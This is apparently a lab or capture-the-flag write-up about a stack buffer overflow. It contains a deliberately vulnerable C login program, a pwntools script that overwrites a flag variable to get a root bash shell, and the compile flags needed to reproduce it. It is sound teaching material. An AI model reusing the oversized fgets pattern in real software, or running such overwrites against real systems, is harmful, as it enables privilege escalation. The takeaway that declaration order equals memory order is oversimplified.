Secure System: Buffer Overflow Variable Overwrite

buffer-overflow stack 32-bit variable-overwrite

Vulnerable Code

secure_system.c 
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    char username[32];

    /* security variable */
    int access_granted = 0;

    printf("=== SECURE SYSTEM LOGIN ===\n");
    printf("Enter username: ");

    /* Vulnerability: reading more than buffer size */
    fgets(username, 64, stdin);

    printf("\nUser entered: %s\n", username);
    printf("Access flag value: 0x%x\n", access_granted);

    if(access_granted == 0)
    {
        printf("Access denied ❌\n");
    }

    if(access_granted == 0x1337)
    {
        printf("\n🔥 SECURITY BYPASSED 🔥\n");
        printf("Access granted. Opening admin shell...\n");

        setreuid(geteuid(), geteuid());
        system("/bin/bash");
    }

    return 0;
}

The Bug

Classic mistake. Buffer holds 32 bytes, but fgets is allowed to read 64. That gives us 32 extra bytes to play with. The developer probably copy-pasted the buffer size into the fgets call without thinking, or changed one and forgot the other.

How the stack looks

Since username is declared first and the stack grows down, access_granted sits right above it in memory:

stack layout 
[username: 32 bytes][access_granted: 4 bytes]

Fill the username field completely and you land exactly at the start of access_granted. No guessing offsets needed—it's clean.

The exploit

We need to hit access_granted with 0x1337. On x86 that's little-endian, so the bytes are 37 13 00 00.

exploit.py 
from pwn import *

p = process('./secure_system')

payload = b'A' * 32          # fill the buffer
payload += p32(0x1337)        # overwrite the flag

p.sendline(payload)
p.interactive()

That's it. Run it, you get a shell.

Building it yourself

If you want to compile from source:

compile 
gcc -m32 -fno-stack-protector -no-pie -o secure_system secure_system.c

You'll need 32-bit libs if you're on x64:

install deps 
sudo apt install gcc-multilib
⚙️ Compile flags
  • -m32 — 32-bit target
  • -fno-stack-protector — no canaries
  • -no-pie — fixed base address

Why this works

The program reads 36 bytes total (32 padding + 4 for the overwrite). fgets doesn't care that username can only hold 32—it just writes where it's told. The extra 4 bytes spill into access_granted, flipping it from 0 to 0x1337. The check passes, setreuid bumps your privileges, and you drop into bash.

Key takeaways

  • Always match your buffer size with your read size—fgets isn't magic
  • Stack layout matters: declaration order = memory order on x86
  • Little-endian means flipping bytes when you write exploits
  • Real binaries have canaries, ASLR, NX—this is just the basics
